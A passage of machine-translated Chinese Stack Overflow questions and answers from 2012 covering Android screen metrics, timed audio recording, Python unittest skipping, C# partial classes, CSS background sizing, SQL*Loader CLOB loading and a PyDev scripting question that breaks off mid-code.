测试中要注意的是使用，`Test.startTest()`这`Test.stopTest()`会强制批处理在继续测试之前执行，从而使您有机会从数据库中选择更新的数据并确保它已按照您的预期进行更改。正如我之前所说，“database.executeBatch()”方法需要将第二个参数传递给它以限制范围内的记录数 - 您可以通过更改执行方法的结构来删除它。唯一要注意的另一件事是，为测试批次创建多个记录是一种很好的做法，但请记住不要创建多个“范围”值，因为您只能从测试中调用一个执行方法。

# c# - 访问从 java 到 dotnet 的请求

> ID：10991184
> 
> 赞同：0
> 
> 时间：2012-06-12T05:53:36.677
> 
> 标签：c#, java, .net, servlets

是否可以从 java servlet 传递请求并在 dot net 中读取该请求并响应该调用，反之亦然......

等待您的宝贵命令

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-12T06:16:30.027

我想根据您的需要建议 Web 服务桥接架构。您可以根据需要在 Java 或 Dot Net 和/或两者中开发 Web 服务。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-12T05:55:29.570

您可以通过在 tcp 端口上传递流来做到这一点，并且您的 dot net 应用程序读取该流并将响应传回给您的 Java 应用程序。

# android - 如何从浏览器将用户重定向到 Google Play 上应用页面的评论标签？

> ID：10991193
> 
> 赞同：10
> 
> 时间：2012-06-12T05:54:22.593
> 
> 标签：android, google-play

我有一个在 google play 上发布的应用程序。我想要一个 url 将用户重定向到谷歌播放应用程序页面上的评论选项卡！

在发布应用程序的文档中，有用于将用户重定向到应用程序的详细信息选项卡（默认）的 url。我希望当用户点击我将在某些网页上发布的链接（如“写评论”）时，登陆页面应该在谷歌播放的应用程序页面上打开评论标签！

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2012-07-06T03:06:00.730

这是一个有效的技巧：将**&reviewId=0**附加到 URL 的末尾。

reviewId 参数允许您链接到特定评论，但如果未找到该评论，您只需进入“用户评论”选项卡即可。

示例：[https ://play.google.com/store/apps/details?id=com.cureatr.messenger&reviewId=0](https://play.google.com/store/apps/details?id=com.cureatr.messenger&reviewId=0)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2020-04-21T04:06:01.947

只是为了更新这个，我认为这不再可能了。在链接到 Google Play 文档中没有这样说： [https ://developer.android.com/distribute/marketing-tools/linking-to-google-play](https://developer.android.com/distribute/marketing-tools/linking-to-google-play)

只需重定向到您的应用程序页面，即可立即看到“评价此应用程序”部分，用户也可以看到“写评论”链接。

# android - Android DisplayMetrics 在 ICS 上返回错误的屏幕尺寸（以像素为单位）

> ID：10991194
> 
> 赞同：24
> 
> 时间：2012-06-12T05:54:26.037
> 
> 标签：android, android-layout, android-screen, android-resolution

这个我试过了......

```
DisplayMetrics metrics = new DisplayMetrics();
getWindowManager().getDefaultDisplay().getMetrics(metrics);
int fullscreenheight = metrics.heightPixels;
int fullscreenwidth = metrics.widthPixels; 
```

和....

```
Display display = getWindowManager().getDefaultDisplay();
Point size = new Point();
display.getSize(size);
int width = size.x;
int height = size.y; 
```

Gnex 的显示屏为 720×1280。返回的宽度/高度结​​果（当然取决于方向）永远不会是 1280。我认为这可能与冰淇淋三明治中的屏幕导航栏有关，所以我将其隐藏为：

```
getWindow().getDecorView().setSystemUiVisibility(View.SYSTEM_UI_FLAG_HIDE_NAVIGATION); 
```

...然后启动一个线程，该线程连续记录屏幕尺寸高度/宽度。即使在 ICS 导航栏完全消失之后....屏幕尺寸也永远不会报告 1280 的值。我会得到这样的数字：

```
width  = 720
height = 1184 
```

如何在 ICS 中获得真正的设备屏幕分辨率？

我需要这个值的原因是因为我的应用程序播放视频，并且我希望视频在设备处于横向时占据整个屏幕。现在我知道你在想什么，为什么不给视频视图一个高度/宽度的“match_parent”值呢？原因是我的视频有多个纵横比，我希望能够根据屏幕的整个宽度计算出正确的视频大小。

* * *

## 回答 #1

> 赞同：21
> 
> 时间：2013-07-07T14:08:41.760

从艾哈迈德的回答来看，这是没有错误的完整代码：

```
 int width = 0, height = 0;
    final DisplayMetrics metrics = new DisplayMetrics();
    Display display = getWindowManager().getDefaultDisplay();
    Method mGetRawH = null, mGetRawW = null;

    try {
        // For JellyBean 4.2 (API 17) and onward
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.JELLY_BEAN_MR1) {
            display.getRealMetrics(metrics);

            width = metrics.widthPixels;
            height = metrics.heightPixels;
        } else {
            mGetRawH = Display.class.getMethod("getRawHeight");
            mGetRawW = Display.class.getMethod("getRawWidth");

            try {
                width = (Integer) mGetRawW.invoke(display);
                height = (Integer) mGetRawH.invoke(display);
            } catch (IllegalArgumentException e) {
                // TODO Auto-generated catch block
                e.printStackTrace();
            } catch (IllegalAccessException e) {
                // TODO Auto-generated catch block
                e.printStackTrace();
            } catch (InvocationTargetException e) {
                // TODO Auto-generated catch block
                e.printStackTrace();
            }
        }
    } catch (NoSuchMethodException e3) {  
        e3.printStackTrace();
    } 
```

* * *

## 回答 #2

> 赞同：20
> 
> 时间：2012-06-12T21:06:02.263

我只为 ICS 找到了这个隐藏的宝藏……如果您的目标 API 高于 ICS，请参阅下面 Chris Schmich 的评论。

[如何在 Android ICS build 上隐藏和显示导航栏](http://bin-liu.blogspot.com/2012/03/how-to-hide-and-display-navigation-bar.html)

万一链接失效....这是获取实际设备屏幕尺寸的方法.....

```
Display display = getWindowManager().getDefaultDisplay();     
Method mGetRawH = Display.class.getMethod("getRawHeight");
Method mGetRawW = Display.class.getMethod("getRawWidth");
int rawWidth = (Integer) mGetRawW.invoke(display);
int rawHeight = (Integer) mGetRawH.invoke(display); 
```

**编辑**（2012 年 11 月 19 日）

上面的代码在 Android 4.2 上将不起作用，并且会引发异常......我还没有找到一种方法来获取 Android 4.2 中设备的全屏尺寸。当我这样做时，我会编辑这个答案，但现在，你应该为 android 4.2 编写应急代码！！

* * *

## 回答 #3

> 赞同：11
> 
> 时间：2015-02-28T11:23:07.150

您可以使用[`getRealSize`](http://developer.android.com/reference/android/view/Display.html#getRealSize%28android.graphics.Point%29)来获取屏幕分辨率。API 17 及更高版本正式支持，但实际上从 API 14 开始就存在于 SDK 中。如果您使用 API 17 或更高版本的 SDK 平台，您可以正常访问该方法，只需绕过关于它仅在 API 中可用的警告17.

```
/**
 * Gets the device's native screen resolution rotated
 * based on the device's current screen orientation.
 */
@TargetApi(Build.VERSION_CODES.JELLY_BEAN_MR1) //To remove warning about using
                                               //getRealSize prior to API 17
private Point screenResolution() {
    WindowManager windowManager =
        (WindowManager) context.getSystemService(Context.WINDOW_SERVICE);
    Display display = windowManager.getDefaultDisplay();
    Point screenResolution = new Point();

    if (Build.VERSION.SDK_INT < 14)
        throw new RuntimeException("Unsupported Android version.");
    display.getRealSize(screenResolution);

    return screenResolution;    
} 
```

我已经在真正的 Android 5.0.2 设备和运行 4.1.1（可能还有其他）的模拟器中对此进行了测试。

感谢[benc](https://stackoverflow.com/users/642160/benkc)在评论中[指出这一点](https://stackoverflow.com/questions/10991194/android-displaymetrics-returns-incorrect-screen-size-in-pixels-on-ics#comment32614508_16276792)。

* * *

## 回答 #4

> 赞同：6
> 
> 时间：2013-04-29T10:51:31.737

试试这个

```
 final DisplayMetrics metrics = new DisplayMetrics(); 
    Display display = getWindowManager().getDefaultDisplay();     
    Method mGetRawH = null,mGetRawW = null;

    try {
                    // For JellyBeans and onward
        if(android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.JELLY_BEAN){
            display.getRealMetrics(metrics);

            realWidth = metrics.widthPixels;
            realHeight = metrics.heightPixels;
        }else{
            mGetRawH = Display.class.getMethod("getRawHeight");
            mGetRawW = Display.class.getMethod("getRawWidth");

            try {
                realWidth = (Integer) mGetRawW.invoke(display);
                realHeight = (Integer) mGetRawH.invoke(display);
            } catch (IllegalArgumentException e) {
                // TODO Auto-generated catch block
                e.printStackTrace();
            } catch (IllegalAccessException e) {
                // TODO Auto-generated catch block
                e.printStackTrace();
            } catch (InvocationTargetException e) {
                // TODO Auto-generated catch block
                e.printStackTrace();
            }
        } 
```

* * *

## 回答 #5

> 赞同：3
> 
> 时间：2014-02-12T19:00:51.087

```
public static Point getRealSize(Display display) {
        Point outPoint = new Point();
        Method mGetRawH;
        try {
            mGetRawH = Display.class.getMethod("getRawHeight");
            Method mGetRawW = Display.class.getMethod("getRawWidth");
            outPoint.x = (Integer) mGetRawW.invoke(display);
            outPoint.y = (Integer) mGetRawH.invoke(display);
            return outPoint;
        } catch (Throwable e) {
            return null;
        }
    }

    public static Point getSize(Display display) {
        if (Build.VERSION.SDK_INT >= 17) {
            Point outPoint = new Point();
            DisplayMetrics metrics = new DisplayMetrics();
            display.getRealMetrics(metrics);
            outPoint.x = metrics.widthPixels;
            outPoint.y = metrics.heightPixels;
            return outPoint;
        }
        if (Build.VERSION.SDK_INT >= 14) {
            Point outPoint = getRealSize(display);
            if (outPoint != null)
                return outPoint;
        }
        Point outPoint = new Point();
        if (Build.VERSION.SDK_INT >= 13) {
            display.getSize(outPoint);
        } else {
            outPoint.x = display.getWidth();
            outPoint.y = display.getHeight();
        }
        return outPoint;
    } 
```

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2012-06-12T06:13:11.870

在某些设备上，例如平板电脑，导航栏根本无法隐藏（[来源](http://developer.android.com/sdk/android-4.0.html)，请参阅“系统 UI 可见性控件”部分），因为没有硬件按钮作为备份。如果在您的设备上您设法隐藏了该栏，您可以制作一个全屏视图并使用 getWidth() 和 getHeight() 请求其大小。

据我所知，没有可靠的方法来获取所有 ICS 设备上的屏幕尺寸。

# android - 在android中录制特定时间段的语音

> ID：10991196
> 
> 赞同：3
> 
> 时间：2012-06-12T05:54:49.953
> 
> 标签：android, audio, audio-recording

我有两个按钮，一个用于开始录制，另一个用于停止录制。我成功录制声音并存储在 sdcard 中：

现在我想要的是，如果我在 15 秒之前按下停止按钮，我应该保持原样，但如果录制时间超过 15 秒，它应该自动停止录制并将录制的文件存储在 sd 卡中：

我的录音代码在这里：

**

```
public void startRecording(View view) throws IOException {
        startButton.setEnabled(false);
        stopButton.setEnabled(true);
        File sampleDir = Environment.getExternalStorageDirectory();
        try {
            //audiofile = File.createTempFile("sound", ".aac", sampleDir);
            audiofile = File.createTempFile("sound", ".m4a", sampleDir);
        } catch (IOException e) {
            Log.e(TAG, "sdcard access error");
            return;
        }
        recorder = new MediaRecorder();
        recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
        recorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
        recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
        recorder.setOutputFile(audiofile.getAbsolutePath());
        recorder.prepare();
        recorder.start();

    } 
```

**

并且停止录制是

```
public void stopRecording(View view) {

        startButton.setEnabled(true);
        stopButton.setEnabled(false);
        recorder.stop();
        recorder.release();

    } 
```

我该怎么办 ？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-06-12T06:08:25.017

基本上你需要为此实现 TimeTask 。

```
 if (view.getId() == R.id.stop) {
            new Timer().schedule(new TimerTask() {

                @Override
                public void run() {
                    runOnUiThread(new Runnable() {    
                        @Override
                        public void run() {
                            mediaRecorder.stop();
                            mediaRecorder.reset();
                            mediaRecorder.release();
                        }
                    });

                }

            }, 15000); //<-- Execute code after 15000 ms i.e after 15 Seconds.

        } 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2017-10-26T06:06:16.897

### Android 多媒体框架支持捕获和编码各种常见的音频和视频格式。如果设备硬件支持，您可以使用 MediaRecorder API。

```
package com.kapil.admin.scrollapplication;

import android.Manifest;
import android.content.Context;
import android.content.pm.PackageManager;
import android.media.MediaPlayer;
import android.media.MediaRecorder;
import android.os.Bundle;
import android.support.annotation.NonNull;
import android.support.v4.app.ActivityCompat;
import android.support.v7.app.AppCompatActivity;
import android.util.Log;
import android.view.View;
import android.view.ViewGroup;
import android.widget.Button;
import android.widget.LinearLayout;

import java.io.IOException;
import java.util.Timer;
import java.util.TimerTask;

public class AudioRecordTest extends AppCompatActivity {

    private static final String LOG_TAG = "AudioRecordTest";
    private static final int REQUEST_RECORD_AUDIO_PERMISSION = 200;
    private static String mFileName = null;

    private RecordButton mRecordButton = null;
    private MediaRecorder mRecorder = null;
    String file;
    private MediaPlayer   mPlayer = null;

    int i=0;
    boolean mRecord=true;
    Timer timer;

    // Requesting permission to RECORD_AUDIO
    private boolean permissionToRecordAccepted = false;
    private String [] permissions = {Manifest.permission.RECORD_AUDIO};

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        switch (requestCode){
            case REQUEST_RECORD_AUDIO_PERMISSION:
                permissionToRecordAccepted  = grantResults[0] == PackageManager.PERMISSION_GRANTED;
                break;
        }
        if (!permissionToRecordAccepted ) finish();

    }

    private void onRecord(boolean start,int i) {
        if (start) {
            startRecording(mFileName+"/audiorecordtest"+i+".3gp");
        } else {
            stopRecording();// stop recording
            startRecording(mFileName+"/audiorecordtest"+i+".3gp");//imeadiatly start recording
        }
    }

    private void startRecording(String file) {
        mRecorder = new MediaRecorder();
        mRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
        mRecorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
        mRecorder.setOutputFile(file);
        mRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);

        try {
            mRecorder.prepare();
        } catch (IOException e) {
            Log.e(LOG_TAG, "prepare() failed");
        }

        mRecorder.start();
    }

    private void stopRecording() {
        mRecorder.stop();
        mRecorder.release();
        mRecorder = null;
    }

    class RecordButton extends android.support.v7.widget.AppCompatButton {
        boolean mStartRecording = true;

        OnClickListener clicker = new OnClickListener() {
            public void onClick(View v) {

                if(!mRecord)
                {
                    if(timer!=null)
                    {
                        timer.cancel();
                        stopRecording();
                        mRecord=true;
                    }
                }

                mRecord=false;
                // start record,at every 10 seconds
                 timer = new Timer();
                timer.schedule(new TimerTask() {
                    @Override
                    public void run() {

                        i++;

                        runOnUiThread(new Runnable() {
                            @Override
                            public void run() {
                                onRecord(mStartRecording,i);
                                mStartRecording = !mStartRecording; // setting false

                            }
                        });

                    }
                },0,10000);

            }
        };

        public RecordButton(Context ctx) {
            super(ctx);
            setText("Start recording");
            setOnClickListener(clicker);
        }
    }

    @Override
    public void onCreate(Bundle icicle) {
        super.onCreate(icicle);

        // Record to the external cache directory for visibility
        mFileName = getExternalCacheDir().getAbsolutePath();
       // mFileName += "/audiorecordtest"+i+".3gp";

        ActivityCompat.requestPermissions(this, permissions, REQUEST_RECORD_AUDIO_PERMISSION);

        LinearLayout ll = new LinearLayout(this);
        mRecordButton = new RecordButton(this);
        ll.addView(mRecordButton,
                new LinearLayout.LayoutParams(
                        ViewGroup.LayoutParams.WRAP_CONTENT,
                        ViewGroup.LayoutParams.WRAP_CONTENT,
                        0));
    }

    @Override
    public void onStop() {
        super.onStop();
        if (mRecorder != null) {
            mRecorder.release();
            mRecorder = null;
        }

        if (mPlayer != null) {
            mPlayer.release();
            mPlayer = null;
        }
    }
} 
```

### 根据您的要求修改类

### 对于基本概念验证此链接

### [https://developer.android.com/guide/topics/media/mediarecorder.html#audio-record-permission](https://developer.android.com/guide/topics/media/mediarecorder.html#audio-record-permission)

# python - 在旧版本的 Python 中使用 `@unittest.skipIf`

> ID：10991198
> 
> 赞同：13
> 
> 时间：2012-06-12T05:54:54.510
> 
> 标签：python, unit-testing, decorator, backport

有了这个`unittest`模块，我喜欢[跳过测试的特性](http://docs.python.org/library/unittest.html#skipping-tests-and-expected-failures)，但它只在 Python 2.7+ 中可用。

例如，考虑`test.py`：

```
import unittest
try:
    import proprietary_module
except ImportError:
    proprietary_module = None

class TestProprietary(unittest.TestCase):
    @unittest.skipIf(proprietary_module is None, "requries proprietary module")
    def test_something_proprietary(self):
        self.assertTrue(proprietary_module is not None)

if __name__ == '__main__':
    unittest.main() 
```

如果我尝试使用早期版本的 Python 运行测试，我会收到错误消息：

```
Traceback (most recent call last):
  File "test.py", line 7, in <module>
    class TestProprietary(unittest.TestCase):
  File "test.py", line 8, in TestProprietary
    @unittest.skipIf(proprietary_module is None, "requries proprietary module")
AttributeError: 'module' object has no attribute 'skipIf' 
```

有没有办法“欺骗”旧版本的 Python 以忽略 unittest 装饰器并跳过测试？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-06-12T06:09:27.690

unittest2 是 Python 2.7 中添加到 unittest 测试框架的新功能的反向移植。它经过测试可在 Python 2.4 - 2.7 上运行。

要使用 unittest2 而不是 unittest 只需将 import unittest 替换为 import unittest2

参考： http: [//pypi.python.org/pypi/unittest2](http://pypi.python.org/pypi/unittest2)

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-06-12T08:02:44.080

一般来说，我建议不要使用`unittest`，因为它没有真正的 pythonic API。

一个好的 Python 测试框架是[`nose`](http://readthedocs.org/docs/nose/). 您可以通过引发`SkipTest`异常来跳过测试，例如：

```
if (sys.version_info < (2, 6, 0)):
    from nose.plugins.skip import SkipTest
    raise SkipTest 
```

这适用于 Python 2.3+

鼻子还有很多特点：

*   你不需要上课。一个函数也可以是一个测试。
*   固定装置的装饰器（设置，拆卸功能）。
*   模块级夹具。
*   期待异常的装饰器。
*   ...

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-06-12T06:02:32.843

使用`if`语句怎么样？

```
if proprietary_module is None:   
    print "Skipping test since it requires proprietary module"
else:
    def test_something_proprietary(self):
        self.assertTrue(proprietary_module is not None) 
```

# iphone - 谁能指导我 instagram 应用程序如何在 iphone sdk 中创建登录和标签栏的视图？

> ID：10991199
> 
> 赞同：2
> 
> 时间：2012-06-12T05:55:02.580
> 
> 标签：iphone, uinavigationcontroller, uitabbarcontroller, instagram

嗨，任何人都可以指导我如何显示登录屏幕，如[instagram](http://itunes.apple.com/in/app/instagram/id389801252?mt=8)、[pinterest](http://itunes.apple.com/us/app/pinterest/id429047995?mt=8) 和其他社交网络应用程序，如[picyou](http://itunes.apple.com/us/app/picyou-share-photos-free-camera/id492468784?mt=8)他们显示这样的登录屏幕

登录前和登录后

![登录前](../Images/69f498c45f426e1aec7542000a513e2e.png) ![登录后](../Images/2251a0b5967c44347a5ea3dd61922355.png)我认为这是两个不同的视图，或者只是他们刚刚更改了标签栏和导航栏？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-24T12:32:19.783

第一个是带有 2 个按钮的 UIView，第二个是自定义的标签栏（可能由 UIView 中的 5 个 UIButton 组成）。

当您没有登录时，第二个选项卡是隐藏的，当您登录时，第一个选项卡是隐藏的。

# opengl-es - cocos2d-iphone中线条绘制中的Alpha覆盖

> ID：10991201
> 
> 赞同：0
> 
> 时间：2012-06-12T05:55:26.543
> 
> 标签：opengl-es, cocos2d-iphone, line-drawing

我是 cocos2d 的初学者。

我正在开发一个画线应用程序，我在其中绘制各种颜色的线。我已经实现了它，我面临的问题是颜色混合。在线条边缘，为了进行抗锯齿，对其应用淡出颜色。当我在它上面画另一条线时，这些线看起来不太好，即混合的叠加层就像图像中的淡出颜色一样可见 ![边缘融合](../Images/dab267d06a52ebc83dbd603f6d9cf603.png)。

我尝试使用`{GL_ONE, GL_ONE_MINUS_SRC_ALPHA}`和`{GL_SRC_ALPHA, GL_ONE_MINUS_SRC_ALPHA}` 作为混合功能，还尝试了其他一些功能，但无法获得正确的混合。在过去的三天里我无法解决这个问题。有人可以帮我解决这个问题吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-12T07:53:18.770

如果您的目标是让两条接触的线看起来像是一个单一的实体对象，并且在共同形状周围有一个褪色的边缘，我认为任何简单的混合模式都无法达到这种效果。

一种方法可能是仅使用纯色（无边缘褪色）将所有线条绘制到外部帧缓冲区，然后尝试在该帧缓冲区上应用模糊或边缘检测着色器，以将边缘放在组合形状周围.

如果您是初学者可能会很困难，但如果您有兴趣，它应该给您一些开始研究的条件。

# iphone - 当我们打开 UIPickerView 时，视图将如何自动滚动？

> ID：10991208
> 
> 赞同：1
> 
> 时间：2012-06-12T05:55:58.970
> 
> 标签：iphone, ios5, uiscrollview, xcode4.2, uipickerview

我在 UIButton 点击​​时打开 UIPickerView 并且我正在通过这个 UIPickerView 调用 UIPickerView 上的提交动画 UIPikerView 从屏幕底部到屏幕中间像键盘一样打开我想在选择器视图显示时向上滚动视图，因为我调用 UIPickerView 的按钮是隐藏的由 UIPikerView 打开时。So how can i auto scroll the view when picker view is open?

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-12T06:02:28.470

您可以使用它向上滚动主视图并向下滚动主视图

```
- (void)scrollUpView {
    CGFloat kMoveRatio = 50.0f // Change to view the buttons
    [UIView beginAnimations:@"UP" context:nil];
    CGRect aVFrame = self.view.frame;
    [self.view setFrame:CGRectMake(aVFrame.origin.x, aVFrame.origin.y - kMoveRatio, aVFrame.size.width, aVFrame.size.height)];
    [UIView commitAnimations];

}

-(void)scrollDownView
{
    [UIView beginAnimations:@"DOWN" context:nil];
    CGRect aVFrame = self.view.frame;
    [self.view setFrame:CGRectMake(aVFrame.origin.x, 0, aVFrame.size.width, aVFrame.size.height)];
    [UIView commitAnimations];
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-12T06:10:36.460

使用以下代码：

```
[UIView animateWithDuration:.5f animations:^{
  CGRect theFrame = myView.frame;
  //Change your frame here
  myView.frame = theFrame;
}]; 
```

# c# - 结合部分类和普通类

> ID：10991214
> 
> 赞同：1
> 
> 时间：2012-06-12T05:56:33.047
> 
> 标签：c#, partial-classes

是否可以像这样将普通类与部分类结合起来：

```
public class ClassA
{
    public string PropertyA {get; set;}
}

public partial class ClassA
{
    public string PropertyB {get; set;}
} 
```

代码的结果应该是：

```
var instance = new ClassA();

instance.PropertyA = "Something";
instance.PropertyB = "Something else"; 
```

C# 是否支持这种模式？

谢谢大家！

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-06-12T05:59:40.240

简短的回答：**不**。MSDN[在这里](http://msdn.microsoft.com/en-us/library/wa80x488%28v=vs.80%29.aspx)声明：

> 所有部分都必须使用 partial 关键字。所有部分必须在编译时可用以形成最终类型。所有部分必须具有相同的可访问性，例如公共、私有等。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-06-12T05:59:49.157

不可以。部分类的所有部分都必须包含`partial`修饰符。从 C# 4 语言规范的第 10.2 节：

> **部分类型声明的每个部分都必须包含一个部分修饰符。**它必须与其他部分具有相同的名称并在相同的命名空间或类型声明中声明。partial 修饰符表示类型声明的附加部分可能存在于别处，但这些附加部分的存在不是必需的；具有单个声明的类型包含部分修饰符是有效的。
> 
> 部分类型的所有部分必须一起编译，以便可以在编译时将这些部分合并为单个类型声明。部分类型特别不允许扩展已编译的类型。

（强调我的。）

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-06-12T05:59:50.847

参与`partial`一个类的所有文件都必须用`partial`. 此外，它们必须存在于同一个程序集中。

您可以使用多态性来扩展 ClassA。还有扩展方法，但正如名称所述，您只能扩展方法。

这是派生类，尽管它与`partial`.

```
public class ClassA
{

    public string PropertyA { get; set; }
}

public class ClassB : ClassA
{
    public string PropertyB { get; set; }
} 
```

# html - 通过 CSS 调整背景图像的大小

> ID：10991216
> 
> 赞同：2
> 
> 时间：2012-06-12T05:56:52.220
> 
> 标签：html, css

我有这个 175x175 的背景图像，但我正试图用它制作一个“CD”封面。在下面的代码中（[jsFiddle 可用](http://jsfiddle.net/weka/5CDnw/2/)），您会看到它没有调整大小，而只是“裁剪”。我该如何解决？

HTML：

```
<div class="cd"><div class="hole"></div></div>
<p>I want the image above to be resized to 75x75... but it's not</p>

<img src="http://userserve-ak.last.fm/serve/126/23679395.jpg" alt="Test" />
<p>Actual image size above.</p> 
```

CSS：

```
.cd {
    -moz-border-radius: 63px;
    -webkit-border-radius: 63px;
    border-radius: 63px;
    background-image: url('http://userserve-ak.last.fm/serve/126/23679395.jpg');
    width: 75px;
    height: 75px;
    position: relative;
    border:1px solid #A1A1A1;
}
.cd .hole {
    width: 20px;
    height: 20px;
    position: absolute;
    background-color: #ddd;
    border:1px solid #A1A1A1;
    left: 28px;
    top: 28px;
    -moz-border-radius: 15px;
    -webkit-border-radius: 15px;
    border-radius: 15px;
} 
```

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-06-12T05:58:25.053

使用[background-size](https://developer.mozilla.org/en/CSS/background-size) CSS 属性：

```
background-size: 75px 75px; 
```

或者：

```
background-size: 100% 100%; 
```

还有速记*[背景](https://developer.mozilla.org/en/CSS/background)*属性：

```
background: url('http://userserve-ak.last.fm/serve/126/23679395.jpg') 100% 100%; 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-06-12T05:59:29.117

像这里一样使用背景大小：

```
.cd {
    -moz-border-radius: 63px;
    -webkit-border-radius: 63px;
    border-radius: 63px;
    background-image: url('http://userserve-ak.last.fm/serve/126/23679395.jpg');
    background-size: 75px;
    width: 75px;
    height: 75px;
    position: relative;
    border:1px solid #A1A1A1;
} 
```

示例：http: [//jsfiddle.net/5CDnw/6/](http://jsfiddle.net/5CDnw/6/)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-06-12T06:05:58.160

使用 background-size:cover 它将填充容器，无论容器的大小是多少。

```
.cd {
    -moz-border-radius: 63px;
    -webkit-border-radius: 63px;
    border-radius: 63px;
    background-image: url('http://userserve-ak.last.fm/serve/126/23679395.jpg');
    background-size:cover;/*Add This*/
    -webkit-background-size: cover;/*Add This for webkit*/
    -moz-background-size: cover;/*Add This for mozilla*/
    -o-background-size: cover;/*Add This for opera*/
    width: 75px;
    height: 75px;
    position: relative;
    border:1px solid #A1A1A1;
} 
```

# jquery - 具有多个 Div 的切换/垂直滑块

> ID：10991225
> 
> 赞同：0
> 
> 时间：2012-06-12T05:57:37.253
> 
> 标签：jquery, asp.net

我有 2 个 div 部分，一个 div 包含视频，其他有表格数据。我想在水平方向上切换它们，即从右到左，反之亦然。如果 video display table div 被隐藏，如果 table 则 video div 将隐藏。

这在垂直方向上工作正常。

```
<div class="option_list">
  <p class="video_head">Video</p>
  <div class="divVideo"> Video frame...</div>
  <p class="table_head">table</p>
  <div class="divtable"> table frame...</div>
</div> 
```

脚本 -

```
 <script type="text/javascript">
    $(document).ready(function () {
      $(".table_head").click(function () {
      $(".divtable").slideToggle();
      $(".divVideo").hide();
     });
   $(".video_head").click(function () {
    $(".divVideo").slideToggle();
    $(".divtable").hide();
   });
});
</script> 
```

如何水平切换？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-12T06:04:57.187

你可以这样写

```
$(document).ready(function () {
      $(".table_head").click(function () {
      $(".divtable").animate({width: 'toggle'});
      $(".divVideo").hide();
     });
   $(".video_head").click(function () {
    $(".divVideo").animate({width: 'toggle'});;
    $(".divtable").hide();
   });
}); 
```

# oracle - 使用 sqlloader 将 clob 列添加到 Oracle 数据库

> ID：10991229
> 
> 赞同：2
> 
> 时间：2012-06-12T05:58:05.883
> 
> 标签：oracle, sql-loader

我有一个这样的文件，由“|”分隔

```
some varchar text | some varchar text | some varchar text | very long text >3500 
```

我需要使用 sqlloader 上传这个文件。表的架构是

```
 Name                                      Null?    Type
 ----------------------------------------- -------- ----------------------------
 NAME                                    NOT NULL VARCHAR2(100)
 TIME                                    NOT NULL VARCHAR2(60)
 EXCEPTION                               NOT NULL VARCHAR2(300)
 DETAILS                                          CLOB 
```

控制文件的内容是

```
LOAD DATA
INFILE *
REPLACE
INTO TABLE BX_TWISTER_ERRORS
fields terminated by '|'
(
  NAME,
  TIME,
  EXCEPTION,
  DETAILS
) 
```

我收到以下错误：

> 可变长度字段超过最大长度。

对于每个详细信息字段。

任何人都可以就使用 SQL 加载程序上传这种带分隔符的文件提供任何建议或解决方案吗？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2016-12-07T14:15:57.697

只需在您的控制文件中添加 CHAR(10000) 或所需的大小。

```
LOAD DATA
INFILE *
REPLACE
INTO TABLE BX_TWISTER_ERRORS
fields terminated by '|'
(
  NAME,
  TIME,
  EXCEPTION,
  DETAILS CHAR(10000)
) 
```

# eclipse-plugin - 每当编辑器文本更改时，在 PyDev 中触发 Jython 脚本

> ID：10991233
> 
> 赞同：1
> 
> 时间：2012-06-12T05:58:27.190
> 
> 标签：eclipse-plugin, pydev

如何在 PyDev Jython 脚本中注册更改文本的通知？

我想为 PyDev 编写一个 Jython 脚本，它将分析编辑器中的文本，然后在某些情况下向文本添加一些注释。每次用户键入内容时，分析应该再次运行。

我通读了[PyDev 中 Jython 脚本的介绍](http://pydev.org/manual_articles_scripting.html)，并查看了[示例脚本](https://github.com/aptana/Pydev/tree/f742ccc87a78a0dbf5fcd618561b3a91cdfbf5f5/plugins/org.python.pydev.jython/jysrc)，但它们似乎都是从命令键触发的。我查看了[PyEdit 类](https://github.com/aptana/Pydev/blob/f742ccc87a78a0dbf5fcd618561b3a91cdfbf5f5/plugins/org.python.pydev/src/org/python/pydev/editor/PyEdit.java)，看起来我应该注册[IPyEditListener3 的 onInputChanged 事件](https://github.com/aptana/Pydev/blob/f742ccc87a78a0dbf5fcd618561b3a91cdfbf5f5/plugins/org.python.pydev/src/org/python/pydev/editor/IPyEditListener3.java)。

我尝试了下面的脚本，但它似乎没有调用我的事件处理程序。我错过了什么？

```
if False:
    from org.python.pydev.editor import PyEdit #@UnresolvedImport
    cmd = 'command string'
    editor = PyEdit

#-------------- REQUIRED LOCALS
#interface: String indicating which command will be executed
assert cmd is not None 

#interface: PyEdit object: this is the actual editor that we will act upon
assert editor is not None

print 'command is:', cmd, ' file is:', editor.getEditorFile().getName()
if cmd == 'onCreateActions':
    from org.python.pydev.editor import IPyEditListener #@UnresolvedImport
    from org.python.pydev.editor import IPyEditListener3 #@UnresolvedImport

